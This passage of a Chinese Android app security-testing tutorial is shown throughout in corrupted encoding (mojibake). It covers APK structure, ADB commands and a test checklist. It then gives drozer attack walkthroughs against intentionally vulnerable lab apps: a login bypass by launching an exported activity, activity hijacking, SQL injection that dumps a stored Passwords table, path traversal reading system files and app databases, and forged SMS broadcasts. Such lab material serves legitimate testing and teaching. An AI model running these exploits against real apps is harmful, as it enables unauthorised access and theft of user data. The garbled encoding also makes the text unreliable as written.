ï¼Œç”¨äºåœ¨Androidè®¾å¤‡ä¸Šæ‰§è¡ŒJavaä»£ç ã€‚ Androidåº”ç”¨ç¨‹åºä¸­çš„æ‰€æœ‰Javaä»£ç éƒ½è¢«ç¼–è¯‘æˆDEXæ–‡ä»¶ï¼Œç„¶åæ‰“åŒ…åˆ°APKæ–‡ä»¶ä¸­ã€‚å½“ç”¨æˆ·å®‰è£…åº”ç”¨ç¨‹åºæ—¶ï¼ŒDEXæ–‡ä»¶ä¼šè¢«è§£å‹å¹¶åŠ è½½åˆ°è®¾å¤‡çš„å†…å­˜ä¸­ï¼Œä»¥ä¾¿åœ¨è®¾å¤‡ä¸Šæ‰§è¡Œåº”ç”¨ç¨‹åºã€‚ resources.arsc: åŒ…å«äº†åº”ç”¨ç¨‹åºçš„æ‰€æœ‰éä»£ç èµ„æºï¼Œå¦‚å­—ç¬¦ä¸²ã€å›¾åƒã€å¸ƒå±€ã€ä¸»é¢˜ç­‰ç­‰ã€‚è¯¥æ–‡ä»¶æ˜¯åº”ç”¨ç¨‹åºä¸­çš„é‡è¦ç»„æˆéƒ¨åˆ†ï¼Œç”¨äºæ”¯æŒåº”ç”¨ç¨‹åºçš„å¤šè¯­è¨€å’Œå¤šç§é…ç½®ã€‚ lib/ï¼šè¿™ä¸ªç›®å½•åŒ…å«äº†åº”ç”¨ç¨‹åºä½¿ç”¨çš„æ‰€æœ‰æœ¬åœ°åº“æ–‡ä»¶ï¼Œé€šå¸¸æŒ‰ç…§ä¸åŒçš„CPUæ¶æ„åˆ†åˆ«å­˜æ”¾ã€‚ res/ï¼šè¿™ä¸ªç›®å½•åŒ…å«äº†åº”ç”¨ç¨‹åºçš„æ‰€æœ‰èµ„æºæ–‡ä»¶ï¼Œä¾‹å¦‚å¸ƒå±€ã€å­—ç¬¦ä¸²ã€å›¾åƒç­‰ã€‚ assets/ï¼šè¿™ä¸ªç›®å½•åŒ…å«äº†åº”ç”¨ç¨‹åºçš„æ‰€æœ‰æœªç¼–è¯‘çš„èµ„æºæ–‡ä»¶ï¼Œä¾‹å¦‚å£°éŸ³ã€è§†é¢‘ç­‰ã€‚ META-INF/ï¼šè¿™ä¸ªç›®å½•åŒ…å«äº†APKæ–‡ä»¶çš„æ•°å­—ç­¾åä¿¡æ¯ã€‚ Android å››å¤§åº”ç”¨ç¨‹åºç»„ä»¶ å®‰å“åº”ç”¨ç¨‹åºç»„ä»¶æŒ‡çš„æ˜¯æ„æˆå®‰å“åº”ç”¨ç¨‹åºçš„åŸºæœ¬å•å…ƒï¼Œä¸»è¦æœ‰ä»¥ä¸‹å››ç§ï¼š ç»„ä»¶åç§° å…·ä½“ç”¨é€” æ´»åŠ¨ï¼ˆActivityï¼‰ è´Ÿè´£ç®¡ç†åº”ç”¨ç¨‹åºçš„ç”¨æˆ·ç•Œé¢ï¼Œé€šè¿‡æ´»åŠ¨å¯ä»¥ä¸ç”¨æˆ·äº¤äº’å³å‘ˆç°å¯ä¾›ç”¨æˆ·äº¤äº’çš„ç•Œé¢ æœåŠ¡ï¼ˆServiceï¼‰ åœ¨åå°è¿è¡Œçš„ç»„ä»¶ï¼Œä¸å…·æœ‰ç”¨æˆ·ç•Œé¢ï¼Œä¸»è¦ç”¨äºæ‰§è¡Œé•¿æ—¶é—´è¿è¡Œçš„ä»»åŠ¡æˆ–å¤„ç†ä¸ç”¨æˆ·ç•Œé¢æ— å…³çš„æ“ä½œã€‚ å¹¿æ’­æ¥æ”¶å™¨ï¼ˆBroadcast Receiverï¼‰ ç”¨äºæ¥æ”¶ç³»ç»Ÿå¹¿æ’­å’Œåº”ç”¨ç¨‹åºå¹¿æ’­ã€‚å³æ³¨å†Œç‰¹å®šäº‹ä»¶ï¼Œå¹¶åœ¨å…¶å‘ç”Ÿæ—¶è¢«æ¿€æ´»ï¼Œä¾‹å¦‚ç”µæ± ç”µé‡å˜åŒ–ã€å±å¹•å¼€å…³ã€ç½‘ç»œè¿æ¥çŠ¶æ€ç­‰ï¼Œä¹Ÿå¯ä»¥æ¥æ”¶æ¥è‡ªå…¶ä»–åº”ç”¨ç¨‹åºå‘é€çš„å¹¿æ’­ã€‚ å†…å®¹æä¾›è€…ï¼ˆContent Providerï¼‰ ç”¨äºç®¡ç†åº”ç”¨ç¨‹åºçš„æ•°æ®ï¼Œå…è®¸å…¶ä»–åº”ç”¨ç¨‹åºè®¿é—®å’Œå…±äº«åº”ç”¨ç¨‹åºçš„æ•°æ®ã€‚å†…å®¹æä¾›è€…å¯ä»¥è®¿é—®æ–‡ä»¶ç³»ç»Ÿã€SQLite æ•°æ®åº“ã€ç½‘ç»œç­‰æ•°æ®æºã€‚ Androidåº”ç”¨å­˜å‚¨æ•°æ® å¯¹ android çš„æ¯ä¸€ä¸ªåº”ç”¨ï¼Œandroid ç³»ç»Ÿä¼šåˆ†é…ä¸€ä¸ªç§æœ‰ç›®å½•ï¼Œç”¨äºå­˜å‚¨åº”ç”¨çš„ç§æœ‰æ•°æ®ã€‚æ­¤ç§æœ‰ç›®å½•é€šå¸¸ä½äº/data/data/åº”ç”¨åç§°/ ADBä½¿ç”¨ Android è°ƒè¯•æ¡¥ (adb) æ˜¯ä¸€ç§åŠŸèƒ½å¤šæ ·çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œå¯è®©æ‚¨ä¸è®¾å¤‡è¿›è¡Œé€šä¿¡ã€‚adb å‘½ä»¤å¯ç”¨äºæ‰§è¡Œå„ç§è®¾å¤‡æ“ä½œï¼Œä¾‹å¦‚å®‰è£…å’Œè°ƒè¯•åº”ç”¨ã€‚adb æä¾›å¯¹ Unix shellï¼ˆå¯ç”¨æ¥åœ¨è®¾å¤‡ä¸Šè¿è¡Œå„ç§å‘½ä»¤ï¼‰çš„è®¿é—®æƒé™ã€‚å®ƒæ˜¯ä¸€ç§å®¢æˆ·ç«¯-æœåŠ¡å™¨ç¨‹åºï¼ŒåŒ…æ‹¬ä»¥ä¸‹ä¸‰ä¸ªç»„ä»¶ï¼š å®¢æˆ·ç«¯ï¼ˆå¯¹åº”PCï¼‰ï¼šç”¨äºå‘é€å‘½ä»¤ã€‚å®¢æˆ·ç«¯åœ¨å¼€å‘æœºå™¨ä¸Šè¿è¡Œã€‚æ‚¨å¯ä»¥é€šè¿‡å‘å‡º adb å‘½ä»¤ä»å‘½ä»¤è¡Œç»ˆç«¯è°ƒç”¨å®¢æˆ·ç«¯ã€‚ å®ˆæŠ¤ç¨‹åº (adbd)ï¼šç”¨äºåœ¨è®¾å¤‡ä¸Šè¿è¡Œå‘½ä»¤ã€‚å®ˆæŠ¤ç¨‹åºåœ¨æ¯ä¸ªè®¾å¤‡ä¸Šä½œä¸ºåå°è¿›ç¨‹è¿è¡Œã€‚ æœåŠ¡ç«¯ï¼šç”¨äºç®¡ç†å®¢æˆ·ç«¯ä¸å®ˆæŠ¤ç¨‹åºä¹‹é—´çš„é€šä¿¡ã€‚æœåŠ¡å™¨åœ¨å¼€å‘æœºå™¨ä¸Šä½œä¸ºåå°è¿›ç¨‹è¿è¡Œã€‚ Android SDKé»˜è®¤è‡ªå¸¦adbï¼Œå®ƒä½äºAndroid SDKçš„platform-toolsç›®å½•ä¸­ å¸¸ç”¨å‘½ä»¤ adb version # æŸ¥çœ‹adbç‰ˆæœ¬ adb devices -l # åˆ—å‡ºè®¾å¤‡ adb tcpip 5555 # æœåŠ¡ç«¯å¼€å¯5555ç«¯å£ adb connect ip:port # è¿æ¥è®¾å¤‡ adb disconnect ip:port # å…³é—­è®¾å¤‡è¿æ¥ adb -s service command # å¤šä¸ªè®¾å¤‡æ—¶-sæŒ‡å®šè®¾å¤‡ adb install path_to_apk -t # å®‰è£…apk adb push pc_file Android _path # ä¸Šä¼ æ–‡ä»¶ adb pull Android _file pc_path # ä¸‹è½½æ–‡ä»¶ # å‘½ä»¤è¡Œæ“ä½œ adb -s service shell # è·å¾—æŒ‡å®šè®¾å¤‡çš„shell # æ‰§è¡Œå‘½ä»¤ adb -s service shell command # æˆ–è€…è¿›å…¥å shell>command # å‘½ä»¤åœ¨/system/binä¸­ pm list packages # æŸ¥çœ‹åº”ç”¨åˆ—è¡¨ pm list packages -e -3 # æŸ¥è¯¢è®¾å¤‡ä¸Šæ‰€æœ‰å·²å¯ç”¨çš„ç¬¬ä¸‰æ–¹åº”ç”¨ç¨‹åºçš„åŒ…ååˆ—è¡¨ getprop ro.build.version.release # å®‰å“ç³»ç»Ÿç‰ˆæœ¬ screencap Android _path # æˆªå›¾ screenrecord /sdcard/demo.mp4 # å½•å± é‡åˆ°çš„é—®é¢˜ more than one device and emulator ä½¿ç”¨-så‚æ•°æŒ‡å®šè®¾å¤‡ adb server version (41) doesn't match this client (39); killing adbå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ç‰ˆæœ¬ä¸ä¸€è‡´ ç”±äºæ‰¾ä¸åˆ°adbwinapi.dll,æ— æ³•ç»§ç»­æ‰§è¡Œä»£ç ã€‚é‡æ–°å®‰è£…ç¨‹åºå¯èƒ½ä¼šè§£å†³æ­¤é—®é¢˜ ç¯å¢ƒå˜é‡é—®é¢˜ è§£ï¼šå°†adb.exeæ–‡ä»¶å¤åˆ¶åˆ°Windows/system32ä¸‹; â€‹ å°†adbwinapi.dllå¤åˆ¶åˆ°Windows/sysWoW64ä¸‹ã€‚ â€‹ è§£å†³ â€‹ æ›´æ”¹åå­—ï¼Œæ›¿æ¢æ¨¡æ‹Ÿå™¨ä¸­çš„adbå³å¯,æˆåŠŸæˆªå›¾ æµ‹è¯•checklist å®¢æˆ·ç«¯ç¨‹åºå®‰å…¨ å®‰è£…åŒ…ç­¾åæ ¡éªŒ å¦‚æœ APK æ²¡æœ‰ ä½¿ç”¨è‡ªå·±çš„è¯ä¹¦è¿›è¡Œç­¾åï¼Œå°†ä¼šå¤±å»å¯¹ç‰ˆæœ¬ç®¡ç†çš„ä¸»åŠ¨æƒã€‚ jarsigner -verify -certs -verbose apk jadx-gui åç¼–è¯‘ä¿æŠ¤ æ²¡æœ‰åç¼–è¯‘ä¿æŠ¤ï¼Œå¯èƒ½è¢«æ¶æ„äººå‘˜è¿›è¡Œé€†å‘ç ´è§£ç­‰æ“ä½œã€‚ ç›´æ¥ä½¿ç”¨jadx-guiæ‰“å¼€å³å¯ï¼Œå¦‚æœæ··æ·†åçš„ä»£ç æ ·ä¾‹ï¼Œé™¤äº†è¦†å†™å’Œæ¥å£ä»¥å¤–çš„å­—æ®µéƒ½æ˜¯æ— æ„ä¹‰çš„åç§°ï¼Œåˆ™è¯´æ˜æ˜¯å®‰å…¨çš„ï¼Œå¦‚ä¸‹å³ä¸ºå®‰å…¨çš„ã€‚ åº”ç”¨å®Œæ•´æ€§æ ¡æ£€ æ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡åç¼–è¯‘çš„æ–¹æ³•åœ¨å®¢æˆ·ç«¯ç¨‹åºä¸­æ¤å…¥è‡ªå·±çš„æœ¨é©¬ï¼Œå®¢æˆ·ç«¯ç¨‹åºå¦‚æœæ²¡æœ‰è‡ªæ ¡éªŒæœºåˆ¶çš„è¯ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šé€šè¿‡ç¯¡æ”¹å®¢æˆ·ç«¯ç¨‹åºçªƒå–æ‰‹æœºç”¨æˆ·çš„éšç§ä¿¡æ¯ã€‚ è§£åŒ… java -jar apktool.jar d -f APK -o DIR ä¿®æ”¹èµ„æºæ–‡ä»¶ æ”¹ä¸€äº›å®¹æ˜“åˆ†è¾¨çš„ï¼Œæ¯”å¦‚logo assets/pmbwe64/css/banklogo/logo æ‰“åŒ… java -jar apktool.jar b -f DIR -o new.apk å¯¹ç”Ÿæˆçš„APKè¿›è¡Œç­¾å APK å¿…é¡»è¿›è¡Œç­¾ååï¼Œæ–¹å¯å®‰è£…å’Œè¿è¡Œã€‚å¦‚æœå¼€å¯äº†â€œå…è®¸æœªçŸ¥æ¥æºçš„åº” ç”¨â€ï¼Œé‚£ä¹ˆ Debug è¯ä¹¦ã€è‡ªç­¾åè¯ä¹¦ã€è¿‡æœŸè¯ä¹¦çš„ç­¾åéƒ½æ˜¯å¯ä»¥çš„ï¼Œä½†æ˜¯ä¸å¯ä»¥ä¸ç­¾ åã€‚ java -jar signapk.jar testkey.x509.pem testkey.pk8 å¾…ç­¾åAPK è¾“å‡ºAPK é‡æ–°å®‰è£…å¯åŠ¨ï¼Œè§‚å¯Ÿæ˜¯å¦æœ‰è‡ªæ ¡éªŒ ä¸æ°å½“çš„é…ç½® Debugæ¨¡å¼ å®¢æˆ·ç«¯è½¯ä»¶ AndroidManifest.xml ä¸­çš„ android:debuggable=\"true\"æ ‡è®°å¦‚æœå¼€å¯ï¼Œå¯è¢«Java è°ƒè¯•å·¥å…·ä¾‹å¦‚ jdb è¿›è¡Œè°ƒè¯•ï¼Œè·å–å’Œç¯¡æ”¹ç”¨æˆ·æ•æ„Ÿä¿¡æ¯ï¼Œç”šè‡³åˆ†æå¹¶ä¸”ä¿®æ”¹ä»£ç å®ç°çš„ä¸šåŠ¡é€»è¾‘ï¼Œæˆ‘ä»¬ç»å¸¸ä½¿ç”¨ android.util.Log æ¥æ‰“å°æ—¥å¿—ï¼Œè½¯ä»¶å‘å¸ƒåè°ƒè¯•æ—¥å¿—è¢«å…¶ä»–å¼€å‘è€…çœ‹åˆ°ï¼Œå®¹æ˜“è¢«åç¼–è¯‘ç ´è§£ã€‚ åº”ç”¨ç¨‹åºæ•°æ®å¯å¤‡ä»½ AndroidMainfest.xml æ–‡ä»¶ä¸­çš„ allowBackup å±æ€§å€¼æ§åˆ¶ï¼Œå…¶é»˜è®¤å€¼ä¸º trueã€‚å½“è¯¥å±æ€§æ²¡æœ‰æ˜¾å¼è®¾ç½®ä¸º false æ—¶,æ”»å‡»è€…å¯é€šè¿‡ adb backup å’Œ adb restore å¯¹ App çš„åº”ç”¨æ•°æ®è¿›è¡Œå¤‡ä»½å’Œæ¢å¤ï¼Œä»è€Œå¯èƒ½è·å–æ˜æ–‡å­˜å‚¨çš„ç”¨æˆ·æ•æ„Ÿä¿¡æ¯ã€‚ ä½¿ç”¨jadx-guiæ‰“å¼€æœç´¢å³å¯ æ•æ„Ÿä¿¡æ¯å®‰å…¨æµ‹è¯• APKåç¼–è¯‘æºç ä¸­æ³„æ¼çš„æ•æ„Ÿä¿¡æ¯ jadx-guiæœç´¢ æ¼æ‰«å¹³å° ç§æœ‰ç›®å½•ä¸‹çš„æ–‡ä»¶æƒé™ ADBè¿æ¥æŸ¥çœ‹ ç§æœ‰ç›®å½•ä¸‹çš„æ–‡ä»¶ä¿¡æ¯æ³„æ¼ ADBè¿æ¥æŸ¥æ‰¾ æ—¥å¿—æ˜¯å¦æ‰“å°æ•æ„Ÿæ•°æ® adb logcat //æŒç»­è¾“å‡ºæ—¥å¿—ï¼Œç›´åˆ° Ctrl+C adb logcat -d > log.txt //ä¸€æ¬¡æ€§è¾“å‡ºæ—¥å¿—ç¼“å­˜ï¼Œä¸ä¼šé˜»å¡ è¡¥å……ï¼šåŸåˆ›]Android APPæ¼æ´ä¹‹æˆ˜ï¼ˆ7ï¼‰â€”â€”ä¿¡æ¯æ³„éœ²æ¼æ´è¯¦è§£-Androidå®‰å…¨-çœ‹é›ª-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|kanxue.com å››å¤§åº”ç”¨ç¨‹åºç»„ä»¶æµ‹è¯• æµ‹è¯•ç”¨APK https://github.com/as0ler/Android-Examples/blob/master/sieve.apk qark/tests/goatdroid.apk at master Â· linkedin/qark (github.com) drozerå®‰è£… PCæ§åˆ¶ç«¯å®‰è£… # å®‰è£…ä¾èµ– python2 -m pip install wheel python2 -m pip install pyyaml python2 -m pip install pyhamcrest python2 -m pip install protobuf python2 -m pip install pyopenssl python2 -m pip install twisted python2 -m pip install service_identity # ä¸‹è½½whlåˆ°æœ¬åœ° wget https://github.com/WithSecureLabs/drozer/releases/download/2.4.4/drozer-2.4.4-py2-none-any.whl python2 -m pip install drozer-2.4.4-py2-none-any.whl è®¾å¤‡ç«¯agentå®‰è£… wget https://github.com/mwrlabs/drozer/releases/download/2.3.4/drozer-agent-2.3.4.apk adb install drozer-agent-2.3.4.apk è¿æ¥ è®¾å¤‡ç«¯å¼€å¯drozer pcæ§åˆ¶ç«¯ï¼ˆæ³¨æ„åœ¨D:\\python2.7\\Scriptsä¸‹å¯åŠ¨drozerï¼‰ # ç«¯å£è½¬å‘ adb forward tcp:31415 tcp:31415 # è¿æ¥ drozer console connect å‡ºç°ä¸‹å›¾è¡¨ç¤ºè¿æ¥æˆåŠŸ ä¹±ç è§£å†³ D:\\python2.7\\Lib\\site-packages\\drozer\\modules\\appä¸‹çš„package.py # å¼€å¤´æ·»åŠ  import sys reload(sys) sys.setdefaultencoding('utf-8') # 360,362è¡ŒæŒ‡å®šå­—ç¬¦ä¸²ä¸ºunicodeå­—ç¬¦ä¸²ï¼Œå‰ç¼€\"u\" self.stdout.write(u\"%s\\n\" % application.packageName) Package æ ¹æ®åå­—æŸ¥æ‰¾APK # run app.package.list -f dz> run app.package.list -f sieve com.mwr.example.sieve (Sieve) è·å¾—APKçš„åŸºæœ¬ä¿¡æ¯ # run app.package.info -a dz> run app.package.info -a com.mwr.example.sieve Package: com.mwr.example.sieve Application Label: Sieve Process Name: com.mwr.example.sieve Version: 1.0 Data Directory: /data/user/0/com.mwr.example.sieve APK Path: /data/app/com.mwr.example.sieve-1/base.apk UID: 10046 GID: [3003] Shared Libraries: null Shared User ID: null Uses Permissions: - android.permission.READ_EXTERNAL_STORAGE - android.permission.WRITE_EXTERNAL_STORAGE - android.permission.INTERNET Defines Permissions: - com.mwr.example.sieve.READ_KEYS - com.mwr.example.sieve.WRITE_KEYS ä¸€é”®æ£€æµ‹APKå­˜åœ¨çš„æ”»å‡»é¢ dz> run app.package.attacksurface com.mwr.example.sieve Attack Surface: 3 activities exported 0 broadcast receivers exported 2 content providers exported 2 services exported is debuggable æ˜¯åŒ…åã€‚ å¯ä»¥çœ‹åˆ°æœ‰3ä¸ªactivityã€0ä¸ªå¹¿æ’­æ¥æ”¶è€…ã€2ä¸ªå†…å®¹æä¾›è€…å’Œ2ä¸ªæœåŠ¡å¯ä»¥è¢«å¯¼å‡ºï¼Œå¹¶ä¸”å¼€å¯äº†debugæ¨¡å¼ Activity æ¼æ´ç§ç±» å±å®³ è¶Šæƒç»•è¿‡ Activity ç”¨æˆ·ç•Œé¢ç»•è¿‡ä¼šé€ æˆç”¨æˆ·ä¿¡æ¯çªƒå– æ‹’ç»æœåŠ¡ é€šè¿‡ Intent ç»™ Activity ä¼ è¾“ç•¸å½¢æ•°æ®ä½¿å¾—ç¨‹åºå´©æºƒä»è€Œå½±å“ç”¨æˆ·ä½“éªŒ Activity åŠ«æŒ ç»„ä»¶å¯¼å‡ºå¯¼è‡´é’“é±¼æ¬ºè¯ˆï¼ŒActivity ç•Œé¢è¢«åŠ«æŒäº§ç”Ÿæ¬ºè¯ˆç­‰å®‰å…¨äº‹ä»¶ éšå¼å¯åŠ¨ intent åŒ…å«æ•æ„Ÿæ•°æ® æ•æ„Ÿä¿¡æ¯æ³„éœ² è·å–å¯å¯¼å‡ºactivity åœ¨ Android ç³»ç»Ÿä¸­ï¼ŒActivity ç»„ä»¶é»˜è®¤æ˜¯ä¸å¯¼å‡ºçš„ï¼Œå¦‚æœ AndroidManifest.xml ä¸­è®¾ç½®äº† exported = \"true\" è¿™æ ·çš„å…³é”®å€¼æˆ–è€…æ˜¯æ·»åŠ äº† è¿™æ ·çš„å±æ€§ï¼Œé‚£ä¹ˆæ­¤æ—¶ Activity ç»„ä»¶æ˜¯å¯¼å‡ºçš„ï¼Œå°±ä¼šå¼•å‘è¶Šæƒç»•è¿‡æˆ–è€…æ˜¯æ³„éœ²æ•æ„Ÿä¿¡æ¯ç­‰çš„å®‰å…¨é£é™©ã€‚ drozerè·å¾—å¯å¯¼å‡ºactivity # run app.activity.info -a dz> run app.activity.info -a com.mwr.example.sieve Package: com.mwr.example.sieve com.mwr.example.sieve.FileSelectActivity Permission: null com.mwr.example.sieve.MainLoginActivity Permission: null com.mwr.example.sieve.PWList Permission: null è¶Šæƒç»•è¿‡æµ‹è¯• æ­£å¸¸ç¬¬ä¸€æ¬¡æ‰“å¼€æ˜¯è¿™æ ·çš„ å¯¹åº”çš„æ˜¯MainLoginActivityè¿™ä¸ªactivity è°ƒç”¨PWListè¿™ä¸ªactivityï¼Œå®ç°ç™»å½•ç»•è¿‡ç•Œé¢ dz> run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList ActivityåŠ«æŒ # ç¯å¢ƒå‡†å¤‡ wget https://github.com/yanghaoi/android_app/raw/master/uihijackv2.0_sign.apk # å®‰è£…ç‚¹å‡»åŠ«æŒè½¯ä»¶ adb install uihijackv2.0_sign.apk åŠ«æŒæµ‹è¯• dz> run app.package.list -f jack com.test.uihijack (Hijackæµ‹è¯•) dz> run app.activity.start --component com.test.uihijack com.test.uihijack.MainActivity åœ¨æ‰“å¼€åŸactivityçš„åŸºç¡€ä¸Šï¼Œè°ƒç”¨æ­¤ç»„ä»¶ï¼Œå¦‚æœuihijackv2.0_signç•Œé¢ä½äºè¢«æµ‹è½¯ä»¶ä¸Šï¼Œåˆ™å­˜åœ¨æ¼æ´ï¼Œå¦åˆ™ä¸å­˜åœ¨æ¼æ´ã€‚å¦‚ä¸‹å›¾ä¸ºå­˜åœ¨æ¼æ´çš„æƒ…å†µã€‚ æ‹’ç»æœåŠ¡æ”»å‡» è°ƒç”¨ç»„ä»¶ï¼ŒæŸ¥çœ‹æ˜¯å¦å¯¼è‡´æ‹’ç»æœåŠ¡ï¼Œè‹¥ç¨‹åºå‡ºç° ç¨‹åºå´©æºƒã€å·²åœæ­¢è¿è¡Œ ç­‰ç¨‹åºæ— æ³•è¿è¡Œæˆ–è‡ªåŠ¨é€€å‡ºè¡Œä¸ºåˆ™ä¸ºæ”»å‡»æˆåŠŸã€‚ http://rui0.cn/archives/30 Content-Provider æ¼æ´ç§ç±» å±å®³ ä¿¡æ¯æ³„éœ² æŸ¥çœ‹ç»„ä»¶æ•°æ®ä¿¡æ¯ SQLæ³¨å…¥ æ³¨å…¥è·å–ç›¸å…³æ•°æ® ç›®å½•éå† è®¿é—®ä»»æ„å¯è¯»æ–‡ä»¶ æŸ¥çœ‹ provider æ•°æ®ç»„ä»¶ä¿¡æ¯ run app.provider.info -a com.mwr.example.sieve ä¿¡æ¯æ³„æ¼ run scanner.provider.finduris -a com.mwr.example.sieve å…³æ³¨çº¢æ¡†éƒ¨åˆ†ï¼Œå¯èƒ½å­˜åœ¨æ•°æ®æ³„éœ²ï¼ŒæŸ¥è¯¢è¯­å¥å¦‚ä¸‹ run app.provider.query sqlæ³¨å…¥ Androidä½¿ç”¨çš„æ˜¯sqlite sqliteæ³¨å…¥çš„ä¸€ç‚¹æ€»ç»“ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com) è¿›è¡Œsqlæ³¨å…¥æ‰«æ run scanner.provider.injection -a è¿›ä¸€æ­¥åˆ©ç”¨ å•å¼•å·æŠ¥é”™ # åŒå¼•å·å†…ä¸ºæ³¨å…¥çš„è¯­å¥ run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/ --projection \"'\" æŸ¥è¯¢æ‰€æœ‰è¡¨ run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/ --projection \"* FROM SQLITE_MASTER WHERE type='table';--\" æŸ¥è¯¢Passwordsè¡¨ run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/ --projection \"* FROM Passwords;--\" ç›®å½•éå† ç›®å½•éå†æ¼æ´æ‰«æ run scanner.provider.traversal -a com.mwr.example.sieve åˆ©ç”¨ç›®å½•éå†è¯»å–æ–‡ä»¶ /etc/hosts run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts åº”ç”¨dbæ–‡ä»¶ run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db ä¸‹è½½æ–‡ä»¶ run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db C:/Users/Khaz/Desktop/database.db Broadcast Receiver æ¼ æ´ç§ç±» å±å®³ æ•æ„Ÿä¿¡æ¯æ³„éœ² å‘é€çš„intentæ²¡æœ‰æ˜ç¡®æŒ‡å®šæ¥æ”¶è€…ï¼Œè€Œæ˜¯ç®€å•çš„é€šè¿‡actionè¿›è¡ŒåŒ¹é…ï¼Œæ¶æ„åº”ç”¨ä¾¿å¯ä»¥æ³¨å†Œä¸€ä¸ªå¹¿æ’­æ¥æ”¶è€…å—…æ¢æ‹¦æˆªåˆ°è¿™ä¸ªå¹¿æ’­ï¼Œå¦‚æœè¿™ä¸ªå¹¿æ’­å­˜åœ¨æ•æ„Ÿæ•°æ®ï¼Œå°±è¢«æ¶æ„åº”ç”¨çªƒå–äº†ã€‚ æƒé™ç»•è¿‡ å¯ä»¥é€šè¿‡ä¸¤ç§æ–¹å¼æ³¨å†Œå¹¿æ’­æ¥æ”¶å™¨ï¼Œä¸€ç§æ˜¯åœ¨AndroidManifest.xmlæ–‡ä»¶ä¸­é€šè¿‡æ ‡ç­¾é™æ€æ³¨å†Œï¼Œå¦ä¸€ç§æ˜¯é€šè¿‡Context.registerReceiver()åŠ¨æ€æ³¨å†Œï¼ŒæŒ‡å®šç›¸åº”çš„intentFilterå‚æ•°ï¼ŒåŠ¨æ€æ³¨å†Œçš„å¹¿æ’­é»˜è®¤éƒ½æ˜¯å¯¼å‡ºçš„ï¼Œå¦‚æœå¯¼å‡ºçš„BroadcastReceiveræ²¡æœ‰åšæƒé™æ§åˆ¶ï¼Œå¯¼è‡´BroadcastReceiverç»„ä»¶å¯ä»¥æ¥æ”¶ä¸€ä¸ªå¤–éƒ¨å¯æ§çš„urlã€æˆ–è€…å…¶ä»–å‘½ä»¤ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥è¶Šæƒåˆ©ç”¨åº”ç”¨çš„ä¸€äº›ç‰¹å®šåŠŸèƒ½ï¼Œæ¯”å¦‚å‘é€æ¶æ„å¹¿æ’­ã€ä¼ªé€ æ¶ˆæ¯ã€ä»»æ„åº”ç”¨ä¸‹è½½å®‰è£…ã€æ‰“å¼€é’“é±¼ç½‘ç«™ç­‰ æ¶ˆæ¯ä¼ªé€  æš´éœ²çš„Receiverå¯¹å¤–æ¥æ”¶Intentï¼Œå¦‚æœæ„é€ æ¶æ„çš„æ¶ˆæ¯æ”¾åœ¨Intentä¸­ä¼ è¾“ï¼Œè¢«è°ƒç”¨çš„Receiveræ¥æ”¶å¯èƒ½äº§ç”Ÿå®‰å…¨éšæ‚£ æ‹’ç»æœåŠ¡ å¦‚æœæ•æ„Ÿçš„BroadcastReceiveræ²¡æœ‰è®¾ç½®ç›¸åº”çš„æƒé™ä¿æŠ¤ï¼Œå¾ˆå®¹æ˜“å—åˆ°æ”»å‡»ã€‚æœ€å¸¸è§çš„æ˜¯æ‹’ç»æœåŠ¡æ”»å‡»ã€‚æ‹’ç»æœåŠ¡æ”»å‡»æŒ‡çš„æ˜¯ï¼Œä¼ é€’æ¶æ„ç•¸å½¢çš„intentæ•°æ®ç»™å¹¿æ’­æ¥æ”¶å™¨ï¼Œå¹¿æ’­æ¥æ”¶å™¨æ— æ³•å¤„ç†å¼‚å¸¸å¯¼è‡´crashã€‚ æ‹’ç»æœåŠ¡æ”»å‡»çš„å±å®³è§†å…·ä½“ä¸šåŠ¡åœºæ™¯è€Œå®šï¼Œæ¯”å¦‚ä¸€ä¸ªå®‰å…¨é˜²æŠ¤äº§å“çš„æ‹’ç»æœåŠ¡ã€é”å±åº”ç”¨çš„æ‹’ç»æœåŠ¡ã€æ”¯ä»˜è¿›ç¨‹çš„æ‹’ç»æœåŠ¡ç­‰å±å®³å°±æ˜¯å·¨å¤§çš„ã€‚ æŸ¥çœ‹å¯å¯¼å‡ºç»„ä»¶ broadcast run app.broadcast.info -a org.owasp.goatdroid.fourgoats org.owasp.goatdroid.fourgoats.broadcastreceivers.SendSMSNowReceiver æ‰¾åˆ°å¯¹åº”å¹¿æ’­ æ¶ˆæ¯ä¼ªé€  ä½¿ç”¨jadxåç¼–è¯‘æ‰¾åˆ°å¯¹åº”çš„æºç ä¿¡æ¯ï¼Œå‘ç°éœ€è¦ä¸¤ä¸ªå‚æ•° phoneNumberã€message å‘é€æ¶æ„å¹¿æ’­ run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --extra string phoneNumber 12345 --extra string message khaz æ‹’ç»æœåŠ¡ å‘é€ä¸å®Œæ•´çš„å¹¿æ’­ run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS Services æ¼æ´ç§ç±» å±å®³ æƒé™æå‡ å½“ä¸€ä¸ªserviceé…ç½®äº†intent-filteré»˜è®¤æ˜¯è¢«å¯¼å‡ºçš„ï¼Œå¦‚æœæ²¡å¯¹è°ƒç”¨Serviceè¿›è¡Œæƒé™ï¼Œé™åˆ¶æˆ–è€…æ˜¯æ²¡æœ‰å¯¹è°ƒç”¨è€…çš„èº«ä»½è¿›è¡Œæœ‰æ•ˆéªŒè¯ï¼Œé‚£ä¹ˆæ¶æ„æ„é€ çš„APPéƒ½å¯ä»¥å¯¹æ­¤Serviceä¼ å…¥æ°å½“çš„å‚æ•°è¿›è¡Œè°ƒç”¨ï¼Œå¯¼è‡´æ¶æ„è¡Œä¸ºå‘ç”Ÿæ¯”å¦‚è°ƒç”¨å…·æœ‰systemæƒé™çš„åˆ é™¤å¸è½½æœåŠ¡åˆ 